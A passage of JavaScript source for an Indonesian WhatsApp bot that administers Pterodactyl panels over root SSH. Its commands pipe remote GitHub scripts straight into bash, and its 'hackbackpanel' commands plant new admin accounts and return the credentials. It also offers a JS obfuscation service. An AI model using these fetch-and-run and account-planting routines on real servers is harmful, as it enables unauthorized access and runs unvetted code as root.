    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
}
break;

case "installtemaelysium": {
if (!isCreator) return reply(mess.owner)
if (global.installtema == undefined) return reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/kontol/refs/heads/main/bangke.sh)`
const ress = new Client();

ress.on('ready', async () => {
reply("Memproses install *tema Elysium* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await reply("Berhasil install *tema Elysium* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
 stream.write('1\n');
stream.write('y\n');
stream.write('yes\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break   

case "installtemanightcore": case "installthemanightcore": {
if (!isCreator) return reply(mess.owner)
if (global.installtema == undefined) return reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl https://raw.githubusercontent.com/NoPro200/Pterodactyl_Nightcore_Theme/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
reply("Memproses install *tema night core* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await reply("Berhasil install *tema nightcore* pterodactyl 🔥")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('1\n');
stream.write('y\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "uninstalltema": {
if (!isCreator) return reply(mess.owner)
if (!text || !text.split("|")) return reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await reply("Memproses *uninstall* thema pterodactyl\nTunggu 1-10 menit hingga proses selesai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await reply("Berhasil *uninstall* thema pterodactyl 🔥")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtema": case "installtemastelar": {
if (!text || !text.split("|")) return reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return reply(mess.owner)
if (global.installtema == undefined) return reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}

const command = `bash <(curl https://raw.githubusercontent.com/Fahrihosting/installthema/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {
await client.sendMessage(m.chat, {
    text: `Berhasil Install *Tema stellar* Pterodactyl✅️`,
    footer: "Danny S8X",
    buttons: [
  { buttonId: '.owner', buttonText: { displayText: 'Owner Danny S8X' }, type: 1,}, 
  {
  buttonId: 'action',
  buttonText: { displayText: 'ini pesan interactiveMeta' },
  type: 4,
  nativeFlowInfo: {
  name: 'single_select',
  paramsJson: JSON.stringify({
  title: 'message',
  sections: [
  {
  title: 'Pilih Menu',
  highlight_label: 'Danny S8X',
  rows: [
{ title: "🔹Uninstall Tema", description: "Untuk Menghapus Tema", id: `.uninstalltema ${ipvps}|${passwd}`},
  ]}]})}}],
    headerType: 1,
    viewOnce: true,
  }, { quoted: loli });
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`fahriofficial\n`) // Key Token : yilzizodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemabilling": case "instaltemabiling": {
if (!isCreator) return reply(mess.owner)
if (!text || !text.split("|")) return reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
if (global.installtema == undefined) return reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
reply("Memproses install *thema billing* pterodactyl\nTunggu 1-10 menit hingga proses selesai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await reply("Berhasil install *thema billing* pterodactyl 🔥")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemaenigma": 
case "instaltemaenigma": {
if (!isCreator) return reply(mess.owner)
if (!text || !text.split("|")) return reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (global.installtema == undefined) return reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
reply("Memproses install *thema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selesai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await reply("Berhasil install *thema enigma* pterodactyl 🔥")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); // Key Token : skyzodev
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6285624297893\n');
stream.write('https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s\n');
stream.write('https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "uninstallpanel": {
if (!isCreator) return reply(mess.owner);
if (!text || !text.split("|")) return reply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return reply(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selesai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await reply("Berhasil *uninstall* server panel 🔥")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
reply('Berhasil Uninstall Server Panel 🔥');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
reply('Katasandi atau IP tidak valid')
}).connect(connSettings)
}
break

//================================================================================

case "installpanel": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await client.sendMessage(m.chat, {text: teks}, {quoted: loli})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By Danny S8X\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By Danny S8X\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selesai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
break  

//================================================================================

case 'encrypt': case 'enc': {
if (!m.quoted) return reply("reply file .js")
if (mime !== "application/javascript") return reply("reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.fileName
await fs.writeFileSync(`./@enc${filename}.js`, media)
await reply("Memproses encrypt code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@enc${filename}.js`).toString(), {
  target: "node",
  preset: "low"
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@enc${filename}.js`, obfuscated)
  await client.sendMessage(m.chat, {document: fs.readFileSync(`./@enc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File Sukses!"}, {quoted: loli})
}).catch(e => reply("Error :" + e))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'encryptmed': case 'encmed': {
if (!m.quoted) return reply("reply file .js")
if (mime !== "application/javascript") return reply("reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.fileName
await fs.writeFileSync(`./@encmed${filename}.js`, media)
await reply("Memproses encrypt code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@encmed${filename}.js`).toString(), {
  target: "node",
  preset: "medium"
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@encmed${filename}.js`, obfuscated)
  await client.sendMessage(m.chat, {document: fs.readFileSync(`./@encmed${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File Sukses!"}, {quoted: loli})
}).catch(e => reply("Error :" + e))
}
break

case 'encrypthard': case "enchard": {
if (!m.quoted) return reply("reply file .js")
if (mime !== "application/javascript") return reply("reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.fileName
await fs.writeFileSync(`./@hardenc${filename}.js`, media)
await reply("Memproses encrypt hard code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${filename}.js`).toString(), {
          target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "Crasher" + 
            "Danny";

        function unidentifiedReplacer(input) {
            return input.replace(
                /[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, ''
            );
        }

        function randomString(panjang) {
            let hasil = '';
            const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            const panjangKarakter = karakter.length;

            for (let i = 0; i < panjang; i++) {
                hasil += karakter.charAt(
                    Math.floor(Math.random() * panjangKarakter)
                );
            }
            return hasil;
        }

        return unidentifiedReplacer(originalString) + randomString(2);
    },
    renameVariables: true,
    renameGlobals: true,
    stringEncoding: 0.01, 
    stringSplitting: 0.1, 
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: true,
    shuffle: {
        hash: false,
        true: false
    },
    stack: false,
    controlFlowFlattening: false, 
    opaquePredicates: false, 
    deadCode: false, 
    dispatcher: false,
    rgf: false,
    calculator: false,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@hardenc${filename}.js`, obfuscated)
  await client.sendMessage(m.chat, {document: fs.readFileSync(`./@hardenc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\n Hard Encryption"}, {quoted: loli})
}).catch(e => reply("Error :" + e))
}
break

case "startwings": case "configurewings": {
if (!isCreator) return reply(mess.owner)
let t = text.split('|')
if (t.length < 3) return reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await reply("*Berhasil menjalankan wings 🔥*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================
case "hbpanel2": case "hackbackpanel2": {
if (!isCreator) return reply(mess.owner)
let t = text.split('|')
if (t.length < 2) return reply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${newuser}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${newpw}\"}`
}]
})
})} 
}}, {userJid: m.chat, quoted: loli})
await client.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "hbpanel": case "hackbackpanel": {
if (!isCreator) return reply(mess.owner)
let t = text.split('|')
if (t.length < 2) return reply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses 🔥*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await client.sendMessage(m.chat, {text: teks}, {quoted: loli})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "subdomain": case "subdo": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("hostname|ipserver"))
if (!text.split("|")) return reply(example("hostname|ipserver"))
let [host, ip] = text.split("|")
let dom = await Object.keys(global.subdomain)
let list = []
for (let i of dom) {
await list.push({
title: i, 
id: `.domain ${dom.indexOf(i) + 1} ${host}|${ip}`
})
}
await client.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Domain',
          sections: [
            {
              title: 'List Domain',
              highlight_label: 'Recommended',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `${botname2}\nAuto Create Subdomain`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Domain Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: loli}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "domain": {
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply("Domain tidak ditemukan!")
if (isNaN(args[0])) return reply("Domain tidak ditemukan!")
const dom = Object.keys(global.subdomain)
if (Number(args[0]) > dom.length) return reply("Domain tidak ditemukan!")
if (!args[1].split("|")) return reply("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then(async (e) => {
if (e['success']) {
let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
await reply(teks)
} else return reply(`${e['error']}`)
})
}
break

//================================================================================

case "cadmin": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await reply("*Berhasil membuat admin panel*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await client.sendMessage(orang, {text: teks}, {quoted: loli})
}
break

case "cadmin1": {
if (!isCreator) return reply(mess.owner)
let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username+crypto.randomBytes(2).toString('hex')
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let tks = `
*Succesfully Created Akun Admin Panel*\nData Akun Sudah Dikirim Ke Nomor ${nomornya}
`
    const listMessage = {
        text: tks,
    }
    await client.sendMessage(m.chat, listMessage)
    await client.sendMessage(nomornya, {
        text: `*PERMISI PESANAN ADP ANDA TELAH SAMPAI 📦*
